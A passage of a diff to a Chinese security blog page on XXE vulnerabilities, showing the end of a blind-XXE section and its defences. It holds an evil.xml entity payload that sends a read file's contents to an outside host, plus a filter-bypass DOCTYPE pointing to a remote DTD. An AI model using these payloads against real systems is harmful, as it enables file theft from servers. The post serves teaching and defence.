class="name">root</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>evil.xml如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all "&lt;!ENTITY % send SYSTEM 'http://192.168.150.1/1.php?file=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure>
+<p>当过滤了&lt;!ENTITY我们该怎么办呢？</p>
+<p>这里给个bypass思路：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE svg SYSTEM "http://vps/xxe.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><blockquote>
+<p>方法1：</p>
+</blockquote>
+<p>使用开发语言提供的禁用外部实体的方法</p>
+<p>PHP：</p>
+<p><code>libxml_disable_entity_loader(true);</code></p>
+<p>JAVA：</p>
+<p><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
+dbf.setExpandEntityReferences(false);</code></p>
+<p>Python:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>方法2：</p>
+</blockquote>
+<p>过滤用户提交的XML数据<br>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。</p>
+<p>参考文章：</p>
+<p><a href="https://www.jianshu.com/p/7325b2ef8fc9" target="_blank" rel="noopener">https://www.jianshu.com/p/7325b2ef8fc9</a></p>
+<p><a href="https://www.cnblogs.com/r00tuser/p/7255939.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/7255939.html</a></p>
+<p><a href="http://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">K0rz3n师傅的文章</a></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="https://yinwc.github.io">Ywc</a>
-            <p>原文链接: <a href="https://yinwc.github.io/2018/09/29/msf/">https://yinwc.github.io/2018/09/29/msf/</a>
-            <p>发表日期: <a href="https://yinwc.github.io/2018/09/29/msf/">September 29th 2018, 7:30:30 pm</a>
+            <p>原文链接: <a href="https://yinwc.github.io/2018/11/19/XXE漏洞学习/">https://yinwc.github.io/2018/11/19/XXE漏洞学习/</a>
+            <p>发表日期: <a href="https://yinwc.github.io/2018/11/19/XXE漏洞学习/">November 19th 2018, 4:42:02 pm</a>
             <p>版权声明: </p>
         </div>
     
@@ -465,17 +517,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/10/01/面试/" title= Web安全知识整理 >
-                    <div class="nextTitle">Web安全知识整理</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/09/28/Dmsj/" title= 代码审计练习 >
-                    <div class="prevTitle">代码审计练习</div>
+                <a href= "/2018/11/16/SSRF/" title= SSRF总结 >
+                    <div class="prevTitle">SSRF总结</div>
                 </a>
             
         </li>
@@ -587,7 +634,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#渗透测试环境准备"><span class="toc-number">2.</span> <span class="toc-text">渗透测试环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开始入侵"><span class="toc-number">3.</span> <span class="toc-text">开始入侵</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息收集—扫描局域网内的机器ip地址"><span class="toc-number">3.1.</span> <span class="toc-text">信息收集—扫描局域网内的机器ip地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用meatsploit攻击"><span class="toc-number">3.2.</span> <span class="toc-text">使用meatsploit攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过Shell-对靶机进行控制"><span class="toc-number">3.3.</span> <span class="toc-text">通过Shell 对靶机进行控制</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#xml基础知识"><span class="toc-number">1.</span> <span class="toc-text">xml基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DTD的概念"><span class="toc-number">2.</span> <span class="toc-text">DTD的概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DTD实体"><span class="toc-number">3.</span> <span class="toc-text">DTD实体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE的攻击与危害"><span class="toc-number">4.</span> <span class="toc-text">XXE的攻击与危害</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造外部外部实体注入的方法"><span class="toc-number">4.1.</span> <span class="toc-text">构造外部外部实体注入的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE的危害"><span class="toc-number">4.2.</span> <span class="toc-text">XXE的危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blind-xxe"><span class="toc-number">5.</span> <span class="toc-text">blind xxe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御方法"><span class="toc-number">6.</span> <span class="toc-text">防御方法</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
